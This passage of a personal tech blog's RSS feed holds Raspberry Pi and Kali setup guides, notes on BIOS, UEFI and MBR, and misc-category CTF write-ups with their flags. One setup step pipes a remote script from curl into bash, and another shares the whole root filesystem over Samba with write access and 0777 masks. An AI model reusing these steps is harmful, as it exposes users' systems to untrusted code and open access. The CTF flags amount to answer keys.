id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h5><p><code>vim /lib/systemd/system/aria.service</code>   </p><pre><code>[Unit]Description=Aria2 ServiceAfter=network.target[Service]User=rootType=forkingExecStart=/usr/bin/aria2c --conf-path=/root/.config/aria2/aria2.config[Install]WantedBy=multi-user.target</code></pre><h4 id="6-Cloudreve搭建"><a href="#6-Cloudreve搭建" class="headerlink" title="6.Cloudreve搭建"></a>6.Cloudreve搭建</h4><pre><code>#解压获取到的主程序tar -zxvf cloudreve_VERSION_OS_ARCH.tar.gz# 赋予执行权限chmod +x ./cloudreve# 启动 Cloudreve./cloudreve</code></pre><p>浏览器中访问http://服务器IP:5212进入 Cloudreve  </p><h5 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h5><p><code>vim /usr/lib/systemd/system/cloudreve.service</code></p><pre><code>[Unit]Description=CloudreveDocumentation=https://docs.cloudreve.orgAfter=network.targetWants=network.target[Service]WorkingDirectory=/cloudExecStart=/cloud/cloudreveRestart=on-abnormalRestartSec=5sKillMode=mixedStandardOutput=nullStandardError=syslog[Install]WantedBy=multi-user.target</code></pre><p>管理命令  </p><pre><code># 开机自启systemctl enable cloudreve# 启动服务systemctl start cloudreve# 停止服务systemctl stop cloudreve# 重启服务systemctl restart cloudreve# 查看状态systemctl status cloudreve</code></pre><h4 id="7-you-get"><a href="#7-you-get" class="headerlink" title="7.you-get"></a>7.you-get</h4><p><code>pip3 install you-get -i https://pypi.douban.com/simple</code></p><h4 id="8-下载smb服务"><a href="#8-下载smb服务" class="headerlink" title="8.下载smb服务"></a>8.下载smb服务</h4><p> <code>apt-get install samba-common-bin samba</code> 下载smb服务<br> <code>vim /etc/samba/smb.conf</code> 修改smb配置文件,添加下面的配置内容</p><pre><code> [kali]path = /valid users = kali browseable = Yeswriteable = Yeswritelist = kalicreate mask = 0777directory mask = 0777</code></pre><p><code>sudo smbpasswd -a kali</code>添加kali用户</p><h4 id="9-安装v2ray客户端"><a href="#9-安装v2ray客户端" class="headerlink" title="9.安装v2ray客户端"></a>9.安装v2ray客户端</h4><p>执行脚本安装<code>bash &lt;(curl -L -s https://install.direct/go.sh)</code><br>会生成下面的文件</p><pre><code>/usr/bin/v2ray/v2ray：V2Ray 程序；/usr/bin/v2ray/v2ctl：V2Ray 工具；/etc/v2ray/config.json：配置文件；/usr/bin/v2ray/geoip.dat：IP 数据文件/usr/bin/v2ray/geosite.dat：域名数据文件</code></pre><p><code>vim/etc/v2ray/config.json</code>文件来配置你需要的代理方式</p><pre><code>{  &quot;inbounds&quot;: [{    &quot;port&quot;: 10808,  // SOCKS 代理端口，在浏览器中需配置代理并指向这个端口    &quot;listen&quot;: &quot;127.0.0.1&quot;,    &quot;protocol&quot;: &quot;socks5&quot;,    &quot;settings&quot;: {      &quot;udp&quot;: true    }  }],  &quot;outbounds&quot;: [{    &quot;protocol&quot;: &quot;vmess&quot;,    &quot;settings&quot;: {      &quot;vnext&quot;: [{        &quot;address&quot;: &quot;xxx.xxx.xxx&quot;, // 服务器地址，请修改为你自己的服务器 ip 或域名        &quot;port&quot;: 65450,  // 服务器端口        &quot;users&quot;: [{ &quot;id&quot;: &quot;xxxxxc8-cc01-4c9d-9b37-513b4ee67989&quot; }]//要与服务端保持一致      }]    }  },{    &quot;protocol&quot;: &quot;freedom&quot;,    &quot;tag&quot;: &quot;direct&quot;,    &quot;settings&quot;: {}  }],  &quot;routing&quot;: {    &quot;domainStrategy&quot;: &quot;IPOnDemand&quot;,    &quot;rules&quot;: [{      &quot;type&quot;: &quot;field&quot;,      &quot;ip&quot;: [&quot;geoip:private&quot;],      &quot;outboundTag&quot;: &quot;direct&quot;    }]  }}}}</code></pre><p>####　９．安装中文输入法、字体、配置区域</p><p><code>apt-get install ttf-wqy-zenhei</code> 安装字体   </p><p><code>dpkg-reconfigure locales</code> 配置区域 选择en_US.UTF-8 UTF-8  、 zh_CN.GBK GBK 、 zh_CN.UTF-8 UTF-8这三个用空格键确定　　</p><p><img src="/2020/07/19/树莓派环境搭建/image-20200719154829629.png" alt="image-20200719154829629">　<code>apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin</code> 安装谷歌拼音</p><h4 id="10-安装蓝牙"><a href="#10-安装蓝牙" class="headerlink" title="10.安装蓝牙"></a>10.安装蓝牙</h4><p><code>apt-get install pi-bluetooth bluez bluez-firmware blueman</code>   </p><p>usermod -G bluetooth -a kali    添加kali到蓝牙用户组   </p><p>usermod -G bluetooth -a 用户名   </p><h4 id="11-更改软件源升级系统"><a href="#11-更改软件源升级系统" class="headerlink" title="11.更改软件源升级系统"></a>11.更改软件源升级系统</h4><p>vim /etc/apt/sources.list 修改软件源为国内镜像</p><pre><code>deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb http://mirrors.neusoft.edu.cn/kali-security/kali/updates main contrib non-freedeb http://mirrors.neusoft.edu.cn/kali kali main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali main non-free contrib</code></pre><p>apt-get update &amp; apt-get upgrade -y 更新软件列表并更新软件</p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/19/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>重装系统及相关知识点</title>
      <link>https://www.jaie.cc/2020/07/11/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        &lt;h2 id=&quot;1-iso镜像直接安装&quot;&gt;&lt;a href=&quot;#1-iso镜像直接安装&quot; class=&quot;headerlink&quot; title=&quot;1.iso镜像直接安装&quot;&gt;&lt;/a&gt;1.iso镜像直接安装&lt;/h2&gt;&lt;p&gt;在下个OSI镜像后,双击打开安装,&lt;br&gt;在选择期间,可以选择把是否把用户数据删除,不用删除也可以安装,当然你想来个完全全新的系统,可以选择删除数据.,&lt;br&gt;再等电脑重启就好了&lt;/p&gt;
&lt;h2 id=&quot;2-ghost-安装（美国赛门铁克公司旗下的硬盘备份还原工具）&quot;&gt;&lt;a href=&quot;#2-ghost-安装（美国赛门铁克公司旗下的硬盘备份还原工具）&quot; class=&quot;headerlink&quot; title=&quot;2.ghost 安装（美国赛门铁克公司旗下的硬盘备份还原工具）&quot;&gt;&lt;/a&gt;2.ghost 安装（美国赛门铁克公司旗下的硬盘备份还原工具）&lt;/h2&gt;&lt;p&gt;s&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="1-iso镜像直接安装"><a href="#1-iso镜像直接安装" class="headerlink" title="1.iso镜像直接安装"></a>1.iso镜像直接安装</h2><p>在下个OSI镜像后,双击打开安装,<br>在选择期间,可以选择把是否把用户数据删除,不用删除也可以安装,当然你想来个完全全新的系统,可以选择删除数据.,<br>再等电脑重启就好了</p><h2 id="2-ghost-安装（美国赛门铁克公司旗下的硬盘备份还原工具）"><a href="#2-ghost-安装（美国赛门铁克公司旗下的硬盘备份还原工具）" class="headerlink" title="2.ghost 安装（美国赛门铁克公司旗下的硬盘备份还原工具）"></a>2.ghost 安装（美国赛门铁克公司旗下的硬盘备份还原工具）</h2><p>s<a id="more"></a><br>  Ghost系统是指通过赛门铁克公司（Symantec Corporation）出品的Ghost在装好的操作系统中进行镜像克隆的版本，通常GHOST用于操作系统的备份，在系统不能正常启动的时候用来进行恢复的。</p><p>  Ghost重装是最简单最方便的重装系统方式，几乎所有的电脑门店和维修店和非官方的系统光盘都是基于Ghost进行重装的，Ghost重装具有操作方便，重装速度快，方法简单的优点<br>Ghost重装系统是从网上下载的操作系统GHO镜像，然后使用Ghost工具（一般使用Onekey Ghost）进行重装。这些镜像系统文件XP的一般在600多M，Win7一般在3–4G左右，Win8一般在3–4G左右</p><h2 id="3-U盘安装"><a href="#3-U盘安装" class="headerlink" title="3.U盘安装"></a>3.U盘安装</h2><p>U盘装系统是目 前一个较为方便的重装系统的方法，只需下载U盘启动盘制作工具制作U盘启动盘，然后在进入系统时设置U盘启动即可，制作工具可以到网上下载。<br>1.下载ISO镜像</p><p>2.使用UltraISO文件将系统ISO写入U盘.<br>3.在BIOS界面上将U盘调整为第一启动项（也可以用电脑U盘启动热键）。<br>4.插入U盘并重启计算机，会自动进入安装程序的安装界面，按照提示安装即可。</p><h2 id="4-PE安装"><a href="#4-PE安装" class="headerlink" title="4.PE安装"></a>4.PE安装</h2><p>PE，Windows PE Windows Preinstallation Environment，Windows预安装环境，Windows预先安装环境（Microsoft Windows Preinstallation Environment，简称Windows PE或WinPE）是简化版的Windows XP、Windows Server 2003、Windows Vista、Windows 7 、Windows 8和Windows 10。WinPE是以光盘或其他可携设备作媒介。WinPE作用是方便大企业作出工作站和服务器的企划、给“原始设备制造商”（OEM）制造自定义的Windows操作系统、取代MS-DOS的磁片。Windows PE可理解为Windows的LiveCD。</p><h2 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h2><p>  新型UEFI，全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。</p><p>  BIOS即Basic Input/Output System，翻成中文是“基本输入/输出系统”，是一种所谓的“固件”，负责在开机时做硬件启动和检测等工作，并且担任操作系统控制硬件时的中介角色。<br>因为硬件发展迅速，传统式（Legacy）BIOS 成为进步的包袱，现在已发展出最新的UEFI（Unified Extensible Firmware Interface）可扩展固件接口，相比传统 BIOS 的来说，未来将是一个“没有特定 BIOS”的电脑时代。</p><h3 id="与legacy-BIOS-相比，UEFI最大的几个区别在于："><a href="#与legacy-BIOS-相比，UEFI最大的几个区别在于：" class="headerlink" title="与legacy BIOS 相比，UEFI最大的几个区别在于："></a>与legacy BIOS 相比，UEFI最大的几个区别在于：</h3><ol><li>编码99%都是由C语言完成；</li><li>一改之前的中断、硬件端口操作的方法，而采用了Driver/protocol的新方式；</li><li>将不支持X86实模式，而直接采用Flat mode（也就是不能用DOS了，现在有些 EFI 或 UEFI 能用是因为做了兼容，但实际上这部分不属于UEFI的定义了）；</li><li>输出也不再是单纯的二进制code，改为Removable Binary Drivers；</li><li>OS启动不再是调用Int19，而是直接利用protocol/device Path；</li><li>对于第三方的开发，前者基本上做不到，除非参与BIOS的设计，但是还要受到ROM的大小限制，而后者就便利多了。<br>7.弥补BIOS对新硬件的支持不足的问题。<h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2>它是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、开机后自检程序和系统自启动程序，它可从CMOS中读写系统设置的具体信息。 其主要功能是为计算机提供最底层的、最直接的硬件设置和控制。此外，BIOS还向作业系统提供一些系统参数。系统硬件的变化是由BIOS隐藏，程序使用BIOS功能而不是直接控制硬件。现代作业系统会忽略BIOS提供的抽象层并直接控制硬件组件。<br></li></ol><h3 id="BIOS芯片中主要存放："><a href="#BIOS芯片中主要存放：" class="headerlink" title="BIOS芯片中主要存放："></a>BIOS芯片中主要存放：<br></h3><p>●自诊断程序：通过读取CMOSRAM中的内容识别硬件配置，并对其进行自检和初始化；<br><br>● CMOS设置程序：引导过程中，用特殊热键启动，进行设置后，存入CMOS RAM中；<br><br>● 系统自举装载程序：在自检成功后将磁盘相对0道0扇区上的引导程序装入内存，让其运行以装入DOS系统；<br><br>● 主要I/O设备的驱动程序和中断服务：由于BIOS直接和系统硬件资源打交道，因此总是针对某一类型的硬件系统，而各种硬件系统又各有不同，所以存在各种不同种类的BIOS，随着硬件技术的发展，同一种BIOS也先后出现了不同的版本，新版本的BIOS比起老版本来说，功能更强。</p><h2 id="GRUB-GRand-Unified-Bootloader"><a href="#GRUB-GRand-Unified-Bootloader" class="headerlink" title="GRUB(GRand Unified Bootloader)"></a>GRUB(GRand Unified Bootloader)</h2><p>  GNU GRUB 和GRUB是GRand Unified Bootloader的缩写，它是一个多重操作系统启动管理器。用来引导不同系统，如windows，linux。<br><br>在X86架构的机器中，Linux、BSD 或其它Unix类的操作系统中GRUB、LILO 是大家最为常用，应该说是主流。<br><br>Windows也有类似的工具NTLOADER；比如我们在机器中安装了Windows 98后，我们再安装一个Windows XP ，在机器启动的会有一个菜单让我们选择进入是进入Windows 98 还是进入Windows XP。NTLOADER就是一个多系统启动引导管理器，NTLOADER 同样也能引导Linux，只是极为麻烦罢了。<br>在PowerPC 架构的机器中，如果安装了Linux的Powerpc 版本，大多是用yaboot 多重引导管理器，比如Apple机用的是IBM PowerPC处理器，所以在如果想在Apple机上，安装Macos 和Linux Powerpc 版本，大多是用yaboot来引导多个操作系统。<br>因为X86架构的机器仍是主流， 所以目前GRUB和LILO 仍然是我们最常用的多重操作系统引导管理器。</p><h3 id="引导过程"><a href="#引导过程" class="headerlink" title="引导过程"></a>引导过程</h3><p>由硬盘启动时，BIOS通常是转向第一块硬盘的第一个扇区，即主引导记录(MBR)。装载GRUB和操作系统的过程，包括以下几个操作步骤：</p><h4 id="装载记录"><a href="#装载记录" class="headerlink" title="装载记录"></a>装载记录</h4><p>基本引导装载程序所做的唯一的事情就是装载第二引导装载程序。<br></p><h3 id="装载Grub"><a href="#装载Grub" class="headerlink" title="装载Grub"></a>装载Grub</h3><p>这第二引导装载程序实际上是引出更高级的功能，以允许用户装载一个特定的操作系统。</p><h3 id="装载系统"><a href="#装载系统" class="headerlink" title="装载系统"></a>装载系统</h3><p>如linux内核。GRUB把机器的控制权移交给操作系统。<br>不同的是，微软操作系统都是使用一种称为链式装载的引导方法来启动的，主引导记录仅仅是简单地指向操作系统所在分区的第一个扇区。</p><h2 id="MBR（Main-Boot-Record）"><a href="#MBR（Main-Boot-Record）" class="headerlink" title="MBR（Main Boot Record）"></a>MBR（Main Boot Record）</h2><p>主引导记录（MBR）是位于磁盘最前边的一段引导（Loader）代码。它负责磁盘操作系统(DOS)对磁盘进行读写时分区合法性的判别、分区引导信息的定位，它由磁盘操作系统(DOS)在对硬盘进行初始化时产生的。<br>通常，我们将包含MBR引导代码的扇区称为主引导扇区。因这一扇区中，引导代码占有绝大部分的空间，故而将习惯将该扇区称为MBR扇区（简称MBR）。由于这一扇区承担有不同于磁盘上其他普通存储空间的特殊管理职能，作为管理整个磁盘空间的一个特殊空间，它不属于磁盘上的任何分区，因而分区空间内的格式化命令不能清除主引导记录的任何信息。</p><h3 id="MBR结构图"><a href="#MBR结构图" class="headerlink" title="MBR结构图"></a>MBR结构图</h3><p>主引导扇区由三个部分组成(共占用512个字节)：<br><br>1.主引导程序即主引导记录（MBR）（占446个字节）<br><br>可在FDISK程序中找到，它用于硬盘启动时将系统控制转给用户指定的并在分区表中登记了的某个操作系统。<br><br>2.磁盘分区表项（DPT，Disk Partition Table)<br>由四个分区表项构成（每个16个字节）。<br><br>负责说明磁盘上的分区情况，其内容由磁盘介质及用户在使用FDISK定义分区时决定。（具体内容略）<br><br>3.结束标志（占2个字节）<br><br>其值为AA55，存储时低位在前，高位在后，即看上去是55AA（十六进制）。</p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/#disqus_thread</comments>
    </item>
    
    <item>
      <title>树莓派安装kali2020教程和坑点</title>
      <link>https://www.jaie.cc/2020/07/11/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali2020%E6%95%99%E7%A8%8B%E5%92%8C%E5%9D%91%E7%82%B9/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali2020%E6%95%99%E7%A8%8B%E5%92%8C%E5%9D%91%E7%82%B9/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h4 id=&quot;1-下载刻录系统镜像&quot;&gt;&lt;a href=&quot;#1-下载刻录系统镜像&quot; class=&quot;headerlink&quot; title=&quot;1.下载刻录系统镜像&quot;&gt;&lt;/a&gt;1.下载刻录系统镜像&lt;/h4&gt;&lt;p&gt;到&lt;a href=&quot;https://note.youdao.com/&quot; ta
        
      
      </description>
      
      <content:encoded><![CDATA[<h4 id="1-下载刻录系统镜像"><a href="#1-下载刻录系统镜像" class="headerlink" title="1.下载刻录系统镜像"></a>1.下载刻录系统镜像</h4><p>到<a href="https://note.youdao.com/" target="_blank" rel="noopener">https://www.offensive-security.com/kali-linux-arm-images/</a>下载镜像。选择自己的对应的型号。需要注意的是这是国外的地址，自备梯子，用种子下比较快一点。<br><img src="/2020/07/11/树莓派安装kali2020教程和坑点/image-20200711063851424.png" alt="image-20200711063851424"><br>选择<strong>Win32DiskImager</strong>这款软件把系统刻录进sd卡，点击写入，等待写入就完成了，sd卡便写入了系统。<br><img src="/2020/07/11/树莓派安装kali2020教程和坑点/image-20200711063908522.png" alt="image-20200711063908522"></p><h4 id="2-树莓派装机"><a href="#2-树莓派装机" class="headerlink" title="2.树莓派装机"></a>2.树莓派装机</h4><p>我是买带风扇的小机箱装好机子后,我把内存卡插进去后，系统没反应，显示器显示的是黑屏，通过网线把树莓派和路由器连接，也没有在路由器后台发现新增的ip，树莓派看了启动失败啊，在我通过一步步排查后，发现是我的风扇排线插错了，囧。但这插线位置也太奇葩了吧，正确的风扇插线还是看图吧。 排线插对果然可以正常开机了，显示屏也亮起来了<br><img src="/2020/07/11/树莓派安装kali2020教程和坑点/image-20200711063925044.png" alt="image-20200711063925044"></p><h4 id="3-关于树莓派kali2020"><a href="#3-关于树莓派kali2020" class="headerlink" title="3.关于树莓派kali2020"></a>3.关于树莓派kali2020</h4><p>进去系统后，发现用之前的root/toor登录系统失败，原来是官方改了默认密码了，新的账号密码为kali/kali，不能用root登录了，进去之后我想用ifconfig、service等命令查看系统信息的，擦，提示没有这个命令，我就想arm系统的kali阉割了这么多东西嘛，然后我用sudo ifconfig就可以了，老版的kali用习惯了。默认root账号密码就不知道了，不过可以修改root密码用<code>sudo passwd root</code>进行修改就行了。</p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali2020%E6%95%99%E7%A8%8B%E5%92%8C%E5%9D%91%E7%82%B9/#disqus_thread</comments>
    </item>
    
    <item>
      <title>攻防世界misc高手区 Wiretup</title>
      <link>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86misc%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86misc%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h5 id=&quot;1-easycap&quot;&gt;&lt;a href=&quot;#1-easycap&quot; class=&quot;headerlink&quot; title=&quot;1.easycap&quot;&gt;&lt;/a&gt;1.easycap&lt;/h5&gt;&lt;p&gt;下载下来是一个流量包，用wireshark打开，搜索关键字flag，第二行追踪tcp
        
      
      </description>
      
      <content:encoded><![CDATA[<h5 id="1-easycap"><a href="#1-easycap" class="headerlink" title="1.easycap"></a>1.easycap</h5><p>下载下来是一个流量包，用wireshark打开，搜索关键字flag，第二行追踪tcp流，</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927172016.png" alt></p><h5 id="2-Avatar"><a href="#2-Avatar" class="headerlink" title="2.Avatar"></a>2.Avatar</h5><p>下载下来是一张图片，这里考察outguess算法，在kali下载outguess，<code>apt-get install outguess</code>,</p><p>“We should blow up the bridge at midnight”即为flag。</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190929114956.png" alt></p><h5 id="3-What-is-this"><a href="#3-What-is-this" class="headerlink" title="3.What-is-this"></a>3.What-is-this</h5><p>下载个解压包，解压后是两张图片，用stegsolve打开其中一张，用image combiner进行xor运算，AZADI TOWER即为flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190929121704.png" alt></p><h5 id="4-Get-the-key-txt"><a href="#4-Get-the-key-txt" class="headerlink" title="4.Get-the-key.txt"></a>4.Get-the-key.txt</h5><p>下载来一个解压包，解压后的文件不知道是什么，用file命令查看一下，是磁盘文件，那就先挂载下</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190929193904.png" alt></p><p>下载后有一大堆乱七八糟，用grep命令查找关键字“key.txt”，在1文件，cat查看是乱码，file查看是什么文件，是压缩文件，gunzip查看flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190929202956.png" alt></p><h5 id="5-签到题"><a href="#5-签到题" class="headerlink" title="5.签到题"></a>5.签到题</h5><p>将<code>Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==</code>base64转码为<code>ggQ@gQ1fqh0ohtjpt_sw{gfhgs&amp;#35;35;}</code>,是凯撒+栅栏，解题关键是flag格式<code>ssctf{}</code>，所以先凯撒得到 <code>ssC@sC1rct0atfvbf_ei{srtse#35;}</code>栅栏得到<code>ssctf{ssCtf_seC10ver#35;@rabit}</code></p><h5 id="6-Training-Stegano-1"><a href="#6-Training-Stegano-1" class="headerlink" title="6.Training-Stegano-1"></a>6.Training-Stegano-1</h5><p>下载是一张图片，记事本打开，文本显示”passwd:steganoI”,flag即为steganoI </p><h5 id="7-Test-flag-please-ignore"><a href="#7-Test-flag-please-ignore" class="headerlink" title="7.Test-flag-please-ignore"></a>7.Test-flag-please-ignore</h5><p>将<code>666c61677b68656c6c6f5f776f726c647d</code>转换为16进制字符串<code>flag{hello_world}</code></p><h5 id="8-Excaliflag"><a href="#8-Excaliflag" class="headerlink" title="8.Excaliflag"></a>8.Excaliflag</h5><p>下载图片后，用stegSolve打开图片</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003125150.png" alt></p><h5 id="9-glance-50"><a href="#9-glance-50" class="headerlink" title="9.glance-50"></a>9.glance-50</h5><p>下载来是一张gif图片，分解gif，使用convert命令分解，<code>convert 33e3d14fb67a44f4ad1378149fff1d9a.gif flag.png</code>共分解出200张图片</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003133442.png" alt></p><p>连接这些图片，使用montage 命令，<code>montage flag*.png -tile x1 -geometry +0+0 flag.png</code></p><p>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p><p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003133722.png" alt></p><p>这里参考了：<a href="https://blog.csdn.net/zz_Caleb/article/details/89490494" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/89490494</a></p><h5 id="10-4-2"><a href="#10-4-2" class="headerlink" title="10.4-2"></a>10.4-2</h5><p>下载后是一个txt文件，里面是不知道是什么，到这个网站<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a>进行词频分析，flag即为<code>flag{classical-cipher_is_not_security_hs}</code></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003134935.png" alt></p><h5 id="11-misc1"><a href="#11-misc1" class="headerlink" title="11.misc1"></a>11.misc1</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008192551.png" alt></p><p>猜测16进制转换字符串，直接转失败转不出来，flag为<code>DDCTF{9af3c9d377b61d269b11337f330c935f}</code></p><pre><code>string=&quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&quot;flag=&quot;&quot;for i in range (0,len(string),2):    s = &quot;0x&quot; + string[i] + string[i+1]    flag += chr(int(s,16) -128)print(flag)</code></pre><h5 id="12-eczmbarrass"><a href="#12-eczmbarrass" class="headerlink" title="12.eczmbarrass"></a>12.eczmbarrass</h5><p>下载压缩包解压后是一个流量包，用wireshark打开，搜索关键词flag后，追踪tcp流，在里面搜索flag，可以看到flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1570082923435.png" alt></p><h5 id="13-肥宅快乐题"><a href="#13-肥宅快乐题" class="headerlink" title="13.肥宅快乐题"></a>13.肥宅快乐题</h5><p>下载后是一个swf文件，是一个游戏，用potplayer打开定位57帧，出现对话里面有U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9，base64解码后为<code>SYC{F3iZhai_ku4ile_T111}</code>，即为flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003141523.png" alt></p><h5 id="14-小小的PDF"><a href="#14-小小的PDF" class="headerlink" title="14.小小的PDF"></a>14.小小的PDF</h5><p>下载后是pdf文件，用binwalk分析，有点东西，用foremost分解东西，flag藏在分解的图片里</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003143315.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003143244.png" alt></p><h5 id="15-Cephalopod"><a href="#15-Cephalopod" class="headerlink" title="15.Cephalopod"></a>15.Cephalopod</h5><p>下载后是一个流量包，用wireshark打开，flag关键字找到flag.png，但是却弄不出来图片。用binwalk看一下有点东西，foremost搞不出来图片</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003164704.png" alt></p><p>了解到有tcpxtract这个工具，Tcpxtract是一种基于文件签名从网络流量中提取文件的工具。安装tcpxtract，并使用分离图片出来，flag值出来了</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003165044.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191003165229.png" alt></p><h5 id="16-hit-the-core"><a href="#16-hit-the-core" class="headerlink" title="16.hit-the-core"></a>16.hit-the-core</h5><p>下载后是.core文件，.core文件是Linux的文件，用strings命令查看，看到一段特殊的文段</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1570093716744.png" alt></p><h5 id="17-pure-color"><a href="#17-pure-color" class="headerlink" title="17.pure_color"></a>17.pure_color</h5><p>下载后是一张图片，用stegsolve打开调试几下，即可看到flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191005225719.png" alt></p><h5 id="18-2-1"><a href="#18-2-1" class="headerlink" title="18.2-1"></a>18.2-1</h5><p>下载后是一张png图片，打开错误，用winhex打开，发现png文件头错误进行修正后发现还是打不开。</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1570289583797.png" alt><br>这里涉及了png文件格式</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/PNG格式示例.png" alt></p><ul><li><p>（固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头</p></li><li><p>（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13</p></li><li><p>（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）</p></li><li><p>（可变）13位数据块（IHDR)</p><ul><li>前四个字节代表该图片的宽</li><li>后四个字节代表该图片的高</li><li>后五个字节依次为：<br>Bit depth、ColorType、Compression method、Filter method、Interlace method</li></ul></li><li><p>（可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。</p><p>使用tweakpng这个工具计算crc校验码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191005233704.png" alt></p></li></ul><p>使用脚本跑出正确的宽709，在windex修改成十六进制为02c5。</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1570290876572.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006000010.png" alt></p><h5 id="19-Janos-the-Ripper"><a href="#19-Janos-the-Ripper" class="headerlink" title="19.Janos-the-Ripper"></a>19.Janos-the-Ripper</h5><p>下载压缩吧解压后不知道是什么文件，用file命令查看下是zip文件，改文件后缀名zip，解压需要密码，进行密码爆破为flag，flag为<code>flag{ev3n::y0u::bru7us?!}</code></p><h5 id="20-2017-Dating-in-Singapore"><a href="#20-2017-Dating-in-Singapore" class="headerlink" title="20.2017_Dating_in_Singapore"></a>20.2017_Dating_in_Singapore</h5><p>题目为新加坡2017日历，附件解压打开时一张2017新加坡的日历，根据给出的数字进行连线，可得flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006174305.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191006174223.png" alt></p><h5 id="21神奇的Modbus"><a href="#21神奇的Modbus" class="headerlink" 